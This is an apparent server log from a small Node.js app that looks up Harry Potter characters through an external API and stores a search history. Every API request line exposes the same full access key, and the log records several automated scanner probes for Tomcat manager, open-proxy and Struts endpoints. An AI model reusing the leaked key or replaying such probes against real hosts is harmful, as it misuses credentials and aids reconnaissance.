nohup: ignoring input
WARNING: The `useMongoClient` option is no longer necessary in mongoose 5.x, please remove it.
    at handleUseMongoClient (/var/www/html/Creative/creative4/node_modules/mongoose/lib/connection.js:604:17)
    at NativeConnection.Connection.openUri (/var/www/html/Creative/creative4/node_modules/mongoose/lib/connection.js:480:7)
    at Mongoose.connect (/var/www/html/Creative/creative4/node_modules/mongoose/lib/index.js:260:15)
    at Object.<anonymous> (/var/www/html/Creative/creative4/app.js:7:10)
    at Module._compile (module.js:577:32)
    at Object.Module._extensions..js (module.js:586:10)
    at Module.load (module.js:494:32)
    at tryModuleLoad (module.js:453:12)
    at Function.Module._load (module.js:445:3)
    at Module.require (module.js:504:17)
    at require (internal/module.js:20:19)
    at Object.<anonymous> (/var/www/html/Creative/creative4/bin/www:7:11)
    at Module._compile (module.js:577:32)
    at Object.Module._extensions..js (module.js:586:10)
    at Module.load (module.js:494:32)
    at tryModuleLoad (module.js:453:12)
(node:32118) DeprecationWarning: current URL string parser is deprecated, and will be removed in a future version. To use the new parser, pass option { useNewUrlParser: true } to MongoClient.connect.
[0mGET / [32m200 [0m9.463 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m1.932 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m1.176 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m9.533 ms - 1642[0m
[0mGET / [36m304 [0m16.772 ms - -[0m
[0mGET /harryStyles.css [36m304 [0m0.822 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.540 ms - -[0m
[0mGET / [32m200 [0m2.604 ms - 1455[0m
[0mGET / [36m304 [0m0.848 ms - -[0m
[0mGET /harryStyles.css [36m304 [0m0.504 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.218 ms - -[0m
[0mGET / [32m200 [0m0.907 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.840 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.388 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m2.061 ms - 1642[0m
[0mGET / [32m200 [0m0.808 ms - 1455[0m
[0mGET / [32m200 [0m3.903 ms - 1455[0m
[0mGET / [32m200 [0m0.603 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.470 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.346 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.930 ms - 1642[0m
[0mGET / [32m200 [0m1.334 ms - 1455[0m
[0mGET / [32m200 [0m0.630 ms - 1455[0m
[0mGET / [32m200 [0m0.706 ms - 1455[0m
[0mGET / [32m200 [0m1.139 ms - 1455[0m
[0mGET / [32m200 [0m1.104 ms - 1455[0m
[0mGET /favicon.ico [33m404 [0m1.231 ms - 1642[0m
[0mGET / [32m200 [0m1.075 ms - 1455[0m
[0mGET /manager/html [33m404 [0m2.233 ms - 1642[0m
[0mGET / [32m200 [0m0.620 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.861 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.462 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m2.234 ms - 1642[0m
https://www.potterapi.com/v1/characters?name=Snape&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Snape [32m200 [0m160.056 ms - 2[0m
in getHistory POST route
{ characterName: 'Snape' }
{ _id: 5beb4febe3d32b7d767756cb, characterName: 'Snape' }
{ _id: 5beb4febe3d32b7d767756cb, characterName: 'Snape', __v: 0 }
[0mPOST /getHistory [32m200 [0m36.590 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Severus Snape&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a1233bc0f5ae10021650d97',
    name: 'Severus Snape',
    role: 'Professor, Potions',
    house: 'Slytherin',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    patronus: 'doe',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: true,
    dumbledoresArmy: false,
    deathEater: true,
    bloodStatus: 'half-blood',
    species: 'human' } ]
[0mGET /character/Severus%20Snape [32m200 [0m81.915 ms - 322[0m
in getHistory POST route
{ characterName: 'Severus Snape' }
{ _id: 5beb4fefe3d32b7d767756cc,
  characterName: 'Severus Snape' }
{ _id: 5beb4fefe3d32b7d767756cc,
  characterName: 'Severus Snape',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m3.912 ms - 2[0m
[0mGET /getHistory [32m200 [0m15.523 ms - 143[0m
https://www.potterapi.com/v1/characters?name=Severus Snape&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a1233bc0f5ae10021650d97',
    name: 'Severus Snape',
    role: 'Professor, Potions',
    house: 'Slytherin',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    patronus: 'doe',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: true,
    dumbledoresArmy: false,
    deathEater: true,
    bloodStatus: 'half-blood',
    species: 'human' } ]
[0mGET /character/Severus%20Snape [36m304 [0m95.192 ms - -[0m
in getHistory POST route
{ characterName: 'Severus Snape' }
{ _id: 5beb4ff8e3d32b7d767756cd,
  characterName: 'Severus Snape' }
{ _id: 5beb4ff8e3d32b7d767756cd,
  characterName: 'Severus Snape',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.277 ms - 2[0m
[0mGET /getHistory [32m200 [0m7.639 ms - 218[0m
https://www.potterapi.com/v1/characters?name=Albus Dumbledore&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a1097653dc2080021cd8763',
    name: 'Albus Dumbledore',
    role: 'Headmaster, Hogwarts',
    house: 'Gryffindor',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    wand: 'Elder, 15", thestral tail hair',
    boggart: 'Ariana (sister)',
    patronus: 'phoenix',
    __v: 0,
    ministryOfMagic: true,
    orderOfThePhoenix: true,
    dumbledoresArmy: false,
    deathEater: false,
    bloodStatus: 'half-blood',
    species: 'human' } ]
[0mGET /character/Albus%20Dumbledore [32m200 [0m97.268 ms - 401[0m
in getHistory POST route
{ characterName: 'Albus Dumbledore' }
{ _id: 5beb5001e3d32b7d767756ce,
  characterName: 'Albus Dumbledore' }
{ _id: 5beb5001e3d32b7d767756ce,
  characterName: 'Albus Dumbledore',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m4.100 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Salazar Slytherin&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a12327c0f5ae10021650d94',
    name: 'Salazar Slytherin',
    role: 'Founder, Hogwarts',
    house: 'Slytherin',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: false,
    dumbledoresArmy: false,
    deathEater: false,
    bloodStatus: 'pure-blood',
    species: 'human' } ]
[0mGET /character/Salazar%20Slytherin [32m200 [0m81.561 ms - 310[0m
in getHistory POST route
{ characterName: 'Salazar Slytherin' }
{ _id: 5beb500de3d32b7d767756cf,
  characterName: 'Salazar Slytherin' }
{ _id: 5beb500de3d32b7d767756cf,
  characterName: 'Salazar Slytherin',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.496 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Goderic Gryffindor&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Goderic%20Gryffindor [32m200 [0m98.185 ms - 2[0m
in getHistory POST route
{ characterName: 'Goderic Gryffindor' }
{ _id: 5beb501be3d32b7d767756d0,
  characterName: 'Goderic Gryffindor' }
{ _id: 5beb501be3d32b7d767756d0,
  characterName: 'Goderic Gryffindor',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.331 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Godric Gryffindor&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a109bfc3dc2080021cd877f',
    name: 'Godric Gryffindor',
    role: 'Founder, Hogwarts',
    house: 'Gryffindor',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: false,
    dumbledoresArmy: false,
    deathEater: false,
    bloodStatus: 'unknown',
    species: 'human' } ]
[0mGET /character/Godric%20Gryffindor [32m200 [0m137.783 ms - 308[0m
in getHistory POST route
{ characterName: 'Godric Gryffindor' }
{ _id: 5beb501fe3d32b7d767756d1,
  characterName: 'Godric Gryffindor' }
{ _id: 5beb501fe3d32b7d767756d1,
  characterName: 'Godric Gryffindor',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.477 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Dobby&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a123c260f5ae10021650db9',
    name: 'Dobby',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: false,
    dumbledoresArmy: false,
    deathEater: false,
    bloodStatus: 'unknown',
    species: 'house-elf' } ]
[0mGET /character/Dobby [32m200 [0m109.616 ms - 198[0m
in getHistory POST route
{ characterName: 'Dobby' }
{ _id: 5beb5029e3d32b7d767756d2, characterName: 'Dobby' }
{ _id: 5beb5029e3d32b7d767756d2, characterName: 'Dobby', __v: 0 }
[0mPOST /getHistory [32m200 [0m5.783 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Aragog&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a123a950f5ae10021650db2',
    name: 'Aragog',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: false,
    dumbledoresArmy: false,
    deathEater: false,
    bloodStatus: 'unknown',
    species: 'acromantula' } ]
[0mGET /character/Aragog [32m200 [0m116.767 ms - 201[0m
in getHistory POST route
{ characterName: 'Aragog' }
{ _id: 5beb5033e3d32b7d767756d3, characterName: 'Aragog' }
{ _id: 5beb5033e3d32b7d767756d3,
  characterName: 'Aragog',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.079 ms - 2[0m
[0mGET /getHistory [32m200 [0m7.501 ms - 669[0m
In the DELETE route?
[0mPOST /delete [32m200 [0m0.746 ms - 2[0m
(node:32118) DeprecationWarning: collection.remove is deprecated. Use deleteOne, deleteMany, or bulkWrite instead.
collection removed
[0mGET /? [32m200 [0m1.203 ms - 1455[0m
[0mGET /harryStyles.css [36m304 [0m0.677 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.328 ms - -[0m
[0mGET /getHistory [32m200 [0m1.493 ms - 2[0m
[0mGET /character/ [33m404 [0m1.004 ms - 1642[0m
[0mGET /getHistory [36m304 [0m1.457 ms - -[0m
[0mGET / [32m200 [0m0.713 ms - 1455[0m
[0mGET / [32m200 [0m2.154 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.818 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.483 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m0.938 ms - 1642[0m
https://www.potterapi.com/v1/characters?name=Harry&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Harry [32m200 [0m158.263 ms - 2[0m
in getHistory POST route
{ characterName: 'Harry' }
{ _id: 5beb6106e3d32b7d767756d4, characterName: 'Harry' }
{ _id: 5beb6106e3d32b7d767756d4, characterName: 'Harry', __v: 0 }
[0mPOST /getHistory [32m200 [0m4.643 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Harry Potter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a12292a0f5ae10021650d7e',
    name: 'Harry Potter',
    role: 'student',
    house: 'Gryffindor',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    alias: 'The Boy Who Lived',
    wand: 'Holly, 11", phoenix feather',
    boggart: 'dementor',
    patronus: 'stag',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: true,
    dumbledoresArmy: true,
    deathEater: false,
    bloodStatus: 'half-blood',
    species: 'human' } ]
[0mGET /character/Harry%20Potter [32m200 [0m81.403 ms - 399[0m
in getHistory POST route
{ characterName: 'Harry Potter' }
{ _id: 5beb610be3d32b7d767756d5, characterName: 'Harry Potter' }
{ _id: 5beb610be3d32b7d767756d5,
  characterName: 'Harry Potter',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.047 ms - 2[0m
[0mGET /getHistory [32m200 [0m1.998 ms - 142[0m
In the DELETE route?
[0mPOST /delete [32m200 [0m0.477 ms - 2[0m
collection removed
[0mGET /? [32m200 [0m0.546 ms - 1455[0m
[0mGET /harryStyles.css [36m304 [0m0.344 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.207 ms - -[0m
[0mGET /character/ [33m404 [0m1.388 ms - 1642[0m
[0mGET / [32m200 [0m0.634 ms - 1455[0m
[0mGET / [32m200 [0m0.606 ms - 1455[0m
[0mGET / [32m200 [0m1.553 ms - 1455[0m
[0mGET / [32m200 [0m2.184 ms - 1455[0m
[0mGET /manager/html [33m404 [0m2.076 ms - 1642[0m
[0mGET / [32m200 [0m3.873 ms - 1455[0m
[0mGET / [32m200 [0m1.195 ms - 1455[0m
[0mGET / [32m200 [0m0.626 ms - 1455[0m
[0mGET / [32m200 [0m1.196 ms - 1455[0m
[0mGET / [32m200 [0m0.601 ms - 1455[0m
[0mGET / [32m200 [0m4.012 ms - 1455[0m
[0mGET / [32m200 [0m0.581 ms - 1455[0m
[0mGET / [32m200 [0m0.548 ms - 1455[0m
[0mGET / [32m200 [0m0.579 ms - 1455[0m
[0mGET / [32m200 [0m0.596 ms - 1455[0m
[0mGET / [32m200 [0m0.631 ms - 1455[0m
[0mGET / [32m200 [0m0.607 ms - 1455[0m
[0mGET / [32m200 [0m0.667 ms - 1455[0m
[0mGET / [32m200 [0m0.877 ms - 1455[0m
[0mGET / [32m200 [0m0.563 ms - 1455[0m
[0mGET / [32m200 [0m0.602 ms - 1455[0m
[0mGET / [32m200 [0m0.644 ms - 1455[0m
[0mGET / [32m200 [0m0.576 ms - 1455[0m
[0mGET / [32m200 [0m0.880 ms - 1455[0m
[0mGET / [32m200 [0m0.671 ms - 1455[0m
[0mGET / [32m200 [0m2.041 ms - 1455[0m
[0mGET / [32m200 [0m0.552 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.486 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.448 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m1.513 ms - 1642[0m
https://www.potterapi.com/v1/characters?name=Tom&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Tom [32m200 [0m221.060 ms - 2[0m
in getHistory POST route
{ characterName: 'Tom' }
{ _id: 5bec26e6e3d32b7d767756d6, characterName: 'Tom' }
{ _id: 5bec26e6e3d32b7d767756d6, characterName: 'Tom', __v: 0 }
[0mPOST /getHistory [32m200 [0m2.803 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Harry Potter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a12292a0f5ae10021650d7e',
    name: 'Harry Potter',
    role: 'student',
    house: 'Gryffindor',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    alias: 'The Boy Who Lived',
    wand: 'Holly, 11", phoenix feather',
    boggart: 'dementor',
    patronus: 'stag',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: true,
    dumbledoresArmy: true,
    deathEater: false,
    bloodStatus: 'half-blood',
    species: 'human' } ]
[0mGET /character/Harry%20Potter [32m200 [0m85.859 ms - 399[0m
in getHistory POST route
{ characterName: 'Harry Potter' }
{ _id: 5bec26eee3d32b7d767756d7, characterName: 'Harry Potter' }
{ _id: 5bec26eee3d32b7d767756d7,
  characterName: 'Harry Potter',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.045 ms - 2[0m
[0mGET /getHistory [32m200 [0m2.439 ms - 140[0m
In the DELETE route?
[0mPOST /delete [32m200 [0m0.396 ms - 2[0m
collection removed
[0mGET /? [32m200 [0m0.694 ms - 1455[0m
[0mGET /harryStyles.css [36m304 [0m0.308 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.323 ms - -[0m
[0mGET /getHistory [32m200 [0m1.353 ms - 2[0m
[0mGET / [32m200 [0m0.605 ms - 1455[0m
[0mGET / [32m200 [0m0.635 ms - 1455[0m
[0mGET / [32m200 [0m0.643 ms - 1455[0m
[0mGET / [32m200 [0m0.652 ms - 1455[0m
[0mGET / [32m200 [0m0.584 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.584 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.455 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m1.308 ms - 1642[0m
https://www.potterapi.com/v1/characters?name=Harry&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Harry [32m200 [0m285.677 ms - 2[0m
in getHistory POST route
{ characterName: 'Harry' }
{ _id: 5bec4e85e3d32b7d767756d8, characterName: 'Harry' }
{ _id: 5bec4e85e3d32b7d767756d8, characterName: 'Harry', __v: 0 }
[0mPOST /getHistory [32m200 [0m2.750 ms - 2[0m
[0mGET /getHistory [32m200 [0m1.573 ms - 68[0m
In the DELETE route?
[0mPOST /delete [32m200 [0m0.391 ms - 2[0m
collection removed
[0mGET /? [32m200 [0m0.534 ms - 1455[0m
[0mGET /harryStyles.css [36m304 [0m0.561 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.584 ms - -[0m
[0mGET /getHistory [32m200 [0m3.685 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Harry Potter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a12292a0f5ae10021650d7e',
    name: 'Harry Potter',
    role: 'student',
    house: 'Gryffindor',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    alias: 'The Boy Who Lived',
    wand: 'Holly, 11", phoenix feather',
    boggart: 'dementor',
    patronus: 'stag',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: true,
    dumbledoresArmy: true,
    deathEater: false,
    bloodStatus: 'half-blood',
    species: 'human' } ]
[0mGET /character/Harry%20Potter [32m200 [0m88.568 ms - 399[0m
in getHistory POST route
{ characterName: 'Harry Potter' }
{ _id: 5bec4e8fe3d32b7d767756d9, characterName: 'Harry Potter' }
{ _id: 5bec4e8fe3d32b7d767756d9,
  characterName: 'Harry Potter',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.232 ms - 2[0m
[0mGET / [36m304 [0m0.469 ms - -[0m
[0mGET /harryStyles.css [36m304 [0m0.301 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.307 ms - -[0m
[0mGET / [32m200 [0m0.724 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.477 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.451 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m1.221 ms - 1642[0m
https://www.potterapi.com/v1/characters?name=Dumbledore&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Dumbledore [32m200 [0m137.359 ms - 2[0m
in getHistory POST route
{ characterName: 'dumbledore' }
{ _id: 5bec55e5e3d32b7d767756da, characterName: 'dumbledore' }
{ _id: 5bec55e5e3d32b7d767756da,
  characterName: 'dumbledore',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.110 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Albus Dumbledore&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a1097653dc2080021cd8763',
    name: 'Albus Dumbledore',
    role: 'Headmaster, Hogwarts',
    house: 'Gryffindor',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    wand: 'Elder, 15", thestral tail hair',
    boggart: 'Ariana (sister)',
    patronus: 'phoenix',
    __v: 0,
    ministryOfMagic: true,
    orderOfThePhoenix: true,
    dumbledoresArmy: false,
    deathEater: false,
    bloodStatus: 'half-blood',
    species: 'human' } ]
[0mGET /character/Albus%20Dumbledore [32m200 [0m100.677 ms - 401[0m
in getHistory POST route
{ characterName: 'Albus Dumbledore' }
{ _id: 5bec55ede3d32b7d767756db,
  characterName: 'Albus Dumbledore' }
{ _id: 5bec55ede3d32b7d767756db,
  characterName: 'Albus Dumbledore',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.796 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Dobby&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a123c260f5ae10021650db9',
    name: 'Dobby',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: false,
    dumbledoresArmy: false,
    deathEater: false,
    bloodStatus: 'unknown',
    species: 'house-elf' } ]
[0mGET /character/Dobby [32m200 [0m109.769 ms - 198[0m
in getHistory POST route
{ characterName: 'Dobby' }
{ _id: 5bec55f5e3d32b7d767756dc, characterName: 'Dobby' }
{ _id: 5bec55f5e3d32b7d767756dc, characterName: 'Dobby', __v: 0 }
[0mPOST /getHistory [32m200 [0m2.419 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Minerva McGonagal&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Minerva%20McGonagal [32m200 [0m83.845 ms - 2[0m
in getHistory POST route
{ characterName: 'Minerva McGonagal' }
{ _id: 5bec55fce3d32b7d767756dd,
  characterName: 'Minerva McGonagal' }
{ _id: 5bec55fce3d32b7d767756dd,
  characterName: 'Minerva McGonagal',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.293 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Minerva McGonagall&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a1223ed0f5ae10021650d70',
    name: 'Minerva McGonagall',
    role: 'Professor, Transfiguration',
    house: 'Gryffindor',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    wand: 'Fir, 9 1/2", dragon heartstring',
    boggart: 'Lord Voldemort',
    patronus: 'cat',
    animagus: 'tabby cat',
    __v: 0,
    ministryOfMagic: true,
    orderOfThePhoenix: true,
    dumbledoresArmy: false,
    deathEater: false,
    bloodStatus: 'half-blood',
    species: 'human' } ]
[0mGET /character/Minerva%20McGonagall [32m200 [0m99.972 ms - 428[0m
in getHistory POST route
{ characterName: 'Minerva McGonagall' }
{ _id: 5bec55fde3d32b7d767756de,
  characterName: 'Minerva McGonagall' }
{ _id: 5bec55fde3d32b7d767756de,
  characterName: 'Minerva McGonagall',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.020 ms - 2[0m
[0mGET / [32m200 [0m0.654 ms - 1455[0m
[0mGET / [32m200 [0m0.613 ms - 1455[0m
[0mGET / [32m200 [0m0.652 ms - 1455[0m
[0mGET / [32m200 [0m1.123 ms - 1455[0m
[0mGET / [32m200 [0m0.708 ms - 1455[0m
[0mGET / [32m200 [0m0.574 ms - 1455[0m
[0mGET / [32m200 [0m1.058 ms - 1455[0m
[0mGET / [32m200 [0m1.172 ms - 1455[0m
[0mGET http://5.188.210.12/echo.php [33m404 [0m1.478 ms - 1642[0m
[0mGET / [32m200 [0m1.069 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.478 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.389 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m1.387 ms - 1642[0m
https://www.potterapi.com/v1/characters?name=Harry&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Harry [32m200 [0m157.226 ms - 2[0m
in getHistory POST route
{ characterName: 'Harry' }
{ _id: 5bec902ee3d32b7d767756df, characterName: 'Harry' }
{ _id: 5bec902ee3d32b7d767756df, characterName: 'Harry', __v: 0 }
[0mPOST /getHistory [32m200 [0m4.204 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Harry Potter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a12292a0f5ae10021650d7e',
    name: 'Harry Potter',
    role: 'student',
    house: 'Gryffindor',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    alias: 'The Boy Who Lived',
    wand: 'Holly, 11", phoenix feather',
    boggart: 'dementor',
    patronus: 'stag',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: true,
    dumbledoresArmy: true,
    deathEater: false,
    bloodStatus: 'half-blood',
    species: 'human' } ]
[0mGET /character/Harry%20Potter [32m200 [0m150.597 ms - 399[0m
in getHistory POST route
{ characterName: 'Harry Potter' }
{ _id: 5bec9036e3d32b7d767756e0, characterName: 'Harry Potter' }
{ _id: 5bec9036e3d32b7d767756e0,
  characterName: 'Harry Potter',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.497 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Nevell Longbottom&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Nevell%20Longbottom [32m200 [0m84.000 ms - 2[0m
in getHistory POST route
{ characterName: 'Nevell Longbottom' }
{ _id: 5bec9045e3d32b7d767756e1,
  characterName: 'Nevell Longbottom' }
{ _id: 5bec9045e3d32b7d767756e1,
  characterName: 'Nevell Longbottom',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m4.578 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Nevall Longbottom&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Nevall%20Longbottom [32m200 [0m167.488 ms - 2[0m
in getHistory POST route
{ characterName: 'Nevall Longbottom' }
{ _id: 5bec9048e3d32b7d767756e2,
  characterName: 'Nevall Longbottom' }
{ _id: 5bec9048e3d32b7d767756e2,
  characterName: 'Nevall Longbottom',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.281 ms - 2[0m
[0mGET /getHistory [32m200 [0m4.044 ms - 750[0m
https://www.potterapi.com/v1/characters?name=Minerva McGonagal&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Minerva%20McGonagal [32m200 [0m93.402 ms - 2[0m
in getHistory POST route
{ characterName: 'Minerva McGonagal' }
{ _id: 5bec9056e3d32b7d767756e3,
  characterName: 'Minerva McGonagal' }
{ _id: 5bec9056e3d32b7d767756e3,
  characterName: 'Minerva McGonagal',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.554 ms - 2[0m
[0mGET /getHistory [32m200 [0m2.913 ms - 829[0m
https://www.potterapi.com/v1/characters?name=Professor Dumbldor&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Professor%20Dumbldor [32m200 [0m93.167 ms - 2[0m
in getHistory POST route
{ characterName: 'Professor Dumbldor' }
{ _id: 5bec9063e3d32b7d767756e4,
  characterName: 'Professor Dumbldor' }
{ _id: 5bec9063e3d32b7d767756e4,
  characterName: 'Professor Dumbldor',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.029 ms - 2[0m
[0mGET / [32m200 [0m2.075 ms - 1455[0m
[0mGET /showcase.action [33m404 [0m0.907 ms - 1642[0m
[0mGET /index.action [33m404 [0m0.825 ms - 1642[0m
[0mGET / [32m200 [0m0.666 ms - 1455[0m
[0mGET / [32m200 [0m0.686 ms - 1455[0m
[0mGET / [32m200 [0m0.616 ms - 1455[0m
[0mGET / [32m200 [0m0.628 ms - 1455[0m
[0mGET / [32m200 [0m0.612 ms - 1455[0m
[0mGET / [32m200 [0m0.707 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.453 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.319 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m1.575 ms - 1642[0m
[0mGET / [32m200 [0m0.617 ms - 1455[0m
[0mGET / [32m200 [0m0.619 ms - 1455[0m
[0mGET / [32m200 [0m0.621 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m3.176 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.436 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m1.040 ms - 1642[0m
[0mGET /getHistory [32m200 [0m4.303 ms - 909[0m
https://www.potterapi.com/v1/characters?name=Dobby&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
